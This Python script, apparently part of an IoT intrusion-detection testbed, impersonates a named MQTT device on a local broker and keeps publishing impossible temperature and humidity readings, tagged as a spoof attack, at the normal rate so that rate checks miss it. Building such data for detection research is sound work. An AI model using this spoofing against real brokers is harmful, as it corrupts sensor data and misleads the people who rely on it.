import paho.mqtt.client as mqtt
import json
import time
import sys
from datetime import datetime, timezone

# ─────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────
BROKER_HOST      = "localhost"
BROKER_PORT      = 1883
PUBLISH_INTERVAL = 5  # same rate as normal — harder to detect by rate alone

# Spoofed values — physically impossible
SPOOF_TEMP = 87.0   # normal range: 10–40°C
SPOOF_HUM  = 5.0    # normal range: 20–95%

# ─────────────────────────────────────────
# Device identity
# ─────────────────────────────────────────
if len(sys.argv) < 2:
    print("Usage: python attacker_spoof.py <device_id>")
    print("Example: python attacker_spoof.py device_01")
    sys.exit(1)

DEVICE_ID = sys.argv[1]
TOPIC     = f"iot/devices/{DEVICE_ID}/data"

# ─────────────────────────────────────────
# MQTT Callbacks
# ─────────────────────────────────────────
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[SPOOF ATTACKER | {DEVICE_ID}] Connected to broker")
    else:
        print(f"[SPOOF ATTACKER | {DEVICE_ID}] Connection failed: {rc}")

# ─────────────────────────────────────────
# MQTT Client Setup
# ─────────────────────────────────────────
client = mqtt.Client(client_id=f"attacker_spoof_{DEVICE_ID}")
client.on_connect = on_connect

client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
client.loop_start()

# ─────────────────────────────────────────
# Main Publishing Loop
# ─────────────────────────────────────────
msg_count = 0

print(f"[SPOOF ATTACKER] Impersonating device: {DEVICE_ID}")
print(f"[SPOOF ATTACKER] Injecting temp={SPOOF_TEMP}°C, hum={SPOOF_HUM}%")
print("-" * 50)

try:
    while True:
        msg_count += 1

        payload = {
            "device_id"   : DEVICE_ID,
            "timestamp"   : datetime.now(timezone.utc).isoformat(),
            "temperature" : SPOOF_TEMP,
            "humidity"    : SPOOF_HUM,
            "msg_count"   : msg_count,
            "payload_size": 0,
            "attack_type" : "spoof"
        }

        payload_str             = json.dumps(payload)
        payload["payload_size"] = len(payload_str.encode("utf-8"))
        payload_str             = json.dumps(payload)

        client.publish(TOPIC, payload_str, qos=0)

        print(f"[SPOOF | {DEVICE_ID}] msg#{msg_count:04d} | "
              f"temp={SPOOF_TEMP}°C | "
              f"hum={SPOOF_HUM}%")

        time.sleep(PUBLISH_INTERVAL)

except KeyboardInterrupt:
    print(f"\n[SPOOF ATTACKER] Stopped.")
    client.loop_stop()
    client.disconnect()